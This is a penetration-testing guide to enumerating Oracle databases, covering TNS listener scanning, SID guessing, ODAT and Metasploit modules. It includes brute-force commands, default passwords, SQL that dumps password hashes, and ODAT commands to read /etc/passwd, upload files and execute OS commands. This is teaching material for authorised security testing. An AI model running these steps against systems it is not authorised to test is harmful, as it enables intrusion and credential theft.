% Filename: 02-reconnaissance/enum-database/oracle.md
% Display name: Oracle Enumeration
% Last update: 2026-02-09
% ATT&CK Tactics: TA0043 (Reconnaissance)
% ATT&CK Techniques: T1595 (Active Scanning)
% Authors: @TristanInSec

# Oracle Enumeration

## Overview

Oracle Database runs on TCP 1521 (TNS Listener) by default. Enumeration targets SID/service name discovery, version detection, authentication testing, and privilege assessment. Oracle is heavily deployed in enterprise environments — banks, government, healthcare — and its complexity creates a large attack surface. The TNS Listener itself can leak information, and default SIDs like `ORCL`, `XE`, and `PROD` are commonly found.

## ATT&CK Mapping

- **Tactic:** TA0043 - Reconnaissance
- **Technique:** T1595 - Active Scanning

## Prerequisites

- Network access to target TCP 1521
- `odat`, `sqlplus`, Nmap, or Metasploit installed
- Optional: `tnscmd10g` for direct TNS Listener queries

## Enumeration Techniques

### Service Detection

```bash
# Nmap
# https://nmap.org/
nmap -sV -p 1521 <target>
```

Expected output:
```text
1521/tcp open  oracle-tns  Oracle TNS listener 11.2.0.2.0
```

The version in the banner reveals the Oracle Database version, which maps directly to patch levels and known vulnerabilities.

### TNS Listener Enumeration

The TNS Listener manages client connections and can leak SIDs, service names, and server configuration:

```bash
# Nmap
# https://nmap.org/
# TNS version and service info
nmap -p 1521 --script oracle-tns-version <target>

# Enumerate SIDs
nmap -p 1521 --script oracle-sid-brute <target>

# Brute-force TNS Listener
nmap -p 1521 --script oracle-brute <target>

# Enumerate users (requires valid SID and credentials)
nmap -p 1521 --script oracle-enum-users --script-args oracle-enum-users.sid=<SID> <target>
```

### SID Discovery

The SID (System Identifier) is required to connect to an Oracle instance. Without it, authentication is not possible:

```bash
# Nmap SID brute-force
# https://nmap.org/
nmap -p 1521 --script oracle-sid-brute <target>
```

Common default SIDs:

| SID | Description |
|-----|-------------|
| ORCL | Default installation |
| XE | Oracle Express Edition |
| PROD | Production (common naming) |
| DEV | Development |
| TEST | Testing |
| DB11G | Version-based naming |
| CATA | Oracle Catalog |

### ODAT (Oracle Database Attacking Tool)

ODAT is a comprehensive Oracle enumeration and exploitation tool by Quentin Hardy (BT Security). Open source, actively maintained, and widely used in the pentest community. Available in the Kali Linux repositories.

```bash
# ODAT
# https://github.com/quentinhardy/odat
# Option 1: Kali package (recommended)
sudo apt install odat

# Option 2: Standalone binary (no dependencies — bundles Oracle client 12.2 internally)
# https://github.com/quentinhardy/odat/releases
# Download the latest linux x64 standalone from the releases page — no install needed
chmod +x odat-linux-libc2.17-x86_64
./odat-linux-libc2.17-x86_64 --help

# Option 3: Development version from source
# https://github.com/quentinhardy/odat
# Requires Oracle Instant Client + cx_Oracle + Python dependencies
# See repo README for full setup — non-trivial
git clone -b master-python3 https://github.com/quentinhardy/odat.git
```

```bash
# ODAT
# https://github.com/quentinhardy/odat
# Full enumeration (SID discovery + all checks)
odat all -s <target> -p 1521

# SID guessing
odat sidguesser -s <target> -p 1521

# Test credentials
odat passwordguesser -s <target> -p 1521 -d <SID>

# Test accounts from a file
odat passwordguesser -s <target> -p 1521 -d <SID> --accounts-file accounts/default.txt
```

ODAT modules for enumeration:

```bash
# ODAT
# https://github.com/quentinhardy/odat
# Check all privileges for a user
odat privesc -s <target> -p 1521 -d <SID> -U <user> -P <password> --get-privs

# Upload a file
odat utlfile -s <target> -p 1521 -d <SID> -U <user> -P <password> --putFile /tmp shell.txt shell.txt

# Read a file
odat utlfile -s <target> -p 1521 -d <SID> -U <user> -P <password> --getFile /etc passwd /tmp/passwd.txt

# Execute OS commands (requires DBA or JAVA privs)
odat java -s <target> -p 1521 -d <SID> -U <user> -P <password> --exec 'whoami'
```

### sqlplus Connection

`sqlplus` is Oracle's proprietary client. It is not on Kali and requires manual installation of Oracle Instant Client (Basic + SQL*Plus packages) from Oracle's website with an Oracle account. For Linux:

```bash
# Oracle Instant Client 19c (not on Kali — requires Oracle account to download)
# 1. Download instantclient-basic and instantclient-sqlplus from:
#    https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html
# 2. Extract both into the same directory
# 3. Set environment variables:
#    export ORACLE_HOME=/opt/oracle/instantclient_19_1
#    export LD_LIBRARY_PATH=$ORACLE_HOME
#    export PATH=$PATH:$ORACLE_HOME
```

For detailed setup instructions, see the [SQL*Plus Instant Client documentation (19c)](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqpug/SQL-Plus-instant-client.html).

For quick Oracle enumeration without this setup, use Nmap NSE scripts and Metasploit modules instead — they require no Oracle client libraries.

```bash
# Connect with credentials
sqlplus <user>/<password>@<target>:1521/<SID>

# Connect as SYSDBA (if permitted)
sqlplus <user>/<password>@<target>:1521/<SID> as sysdba
```

Once connected:

```sql
-- Server version
SELECT * FROM v$version;
SELECT banner FROM v$version WHERE ROWNUM = 1;

-- Current user and privileges
SELECT user FROM dual;
SELECT * FROM session_privs;
SELECT * FROM user_role_privs;

-- Check DBA role
SELECT * FROM user_role_privs WHERE granted_role = 'DBA';

-- List databases (tablespaces)
SELECT tablespace_name FROM dba_tablespaces;

-- List all users
SELECT username, account_status FROM dba_users;

-- List all tables accessible to current user
SELECT owner, table_name FROM all_tables;

-- Dump password hashes (DBA required)
SELECT username, password FROM dba_users;

-- Oracle 11g+ hashes
SELECT name, spare4 FROM sys.user$;
```

### Default Credentials

Oracle has many well-known default accounts. Test these after discovering a valid SID. **Note:** Since Oracle 11gR2 (2009), the installer requires passwords to be set during installation — defaults like `change_on_install` and `manager` are no longer auto-applied on modern versions. Test them on legacy deployments or when the installer was rushed:

| Username | Password | Description |
|----------|----------|-------------|
| SYS | change_on_install | Database superuser (legacy default, pre-11gR2) |
| SYSTEM | manager | Database admin (legacy default, pre-11gR2) |
| SCOTT | tiger | Sample schema (disabled by default in 11g+) |
| DBSNMP | dbsnmp | Database monitoring |
| HR | hr | Human Resources sample |
| MDSYS | mdsys | Spatial data |
| OUTLN | outln | Plan stability |

### Metasploit Modules

```bash
# Metasploit
# https://www.metasploit.com/
# TNS Listener version
auxiliary/scanner/oracle/tnslsnr_version

# SID enumeration
auxiliary/scanner/oracle/sid_enum

# SID brute-force
auxiliary/scanner/oracle/sid_brute

# Login testing
auxiliary/scanner/oracle/oracle_login

# Hash dump
auxiliary/scanner/oracle/oracle_hashdump

# iSQL*Plus login (web interface)
auxiliary/scanner/oracle/isqlplus_login

# TNS Poison checker (CVE-2012-1675)
auxiliary/scanner/oracle/tnspoison_checker
```

### Configuration Files

| File | Location | Contains |
|------|----------|----------|
| listener.ora | $ORACLE_HOME/network/admin/ | Listener configuration, SIDs |
| tnsnames.ora | $ORACLE_HOME/network/admin/ | Connection descriptors |
| sqlnet.ora | $ORACLE_HOME/network/admin/ | Network configuration |
| init.ora / spfile | $ORACLE_HOME/dbs/ | Instance parameters |
| orapw\<SID\> | $ORACLE_HOME/dbs/ | Password file for SYS |

## Post-Enumeration

With Oracle access, prioritize:
- DBA role check — if granted, full database and potentially OS access
- Password hashes from `dba_users` or `sys.user$` for offline cracking
- Default credentials — Oracle has dozens of default accounts
- Java execution privileges for OS command execution via ODAT
- File read/write via `UTL_FILE` or ODAT for sensitive file extraction
- `tnsnames.ora` and `listener.ora` for additional connection targets
- Credential reuse — Oracle passwords often match OS or other service credentials

## References

### Official Documentation

- [Oracle Instant Client Downloads](https://www.oracle.com/database/technologies/instant-client/downloads.html)
- [Oracle SQL*Plus Instant Client Documentation (19c)](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqpug/SQL-Plus-instant-client.html)
- [Nmap oracle-sid-brute NSE Script](https://nmap.org/nsedoc/scripts/oracle-sid-brute.html)
- [Nmap oracle-brute NSE Script](https://nmap.org/nsedoc/scripts/oracle-brute.html)

### Pentest Guides & Research

- [ODAT — Oracle Database Attacking Tool (source)](https://github.com/quentinhardy/odat)
- [ODAT Releases — Standalone Binaries](https://github.com/quentinhardy/odat/releases)
- [ODAT — Kali Linux Tools](https://www.kali.org/tools/odat/)

### CVE References

- [CVE-2012-1675 — Oracle TNS Poison Attack](https://nvd.nist.gov/vuln/detail/CVE-2012-1675)

### MITRE ATT&CK

- [T1595 — Active Scanning](https://attack.mitre.org/techniques/T1595/)
- [T1078.001 — Valid Accounts: Default Accounts](https://attack.mitre.org/techniques/T1078/001/)
